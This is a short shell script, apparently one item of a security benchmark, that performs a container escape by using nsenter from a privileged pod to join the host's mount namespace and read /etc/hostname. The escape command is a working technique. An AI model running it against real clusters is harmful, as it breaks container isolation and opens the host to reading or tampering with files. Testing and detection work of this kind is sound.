#!/bin/sh
# From a privileged pod that shares the host PID namespace, join PID 1's
# mount namespace and read a host file: a classic container escape.
mkdir -p /tmp/bench || exit 1
echo "BENCH_ACTION $(date +%s%3N)"
nsenter -t 1 -m -- cat /etc/hostname > /tmp/bench/07.out
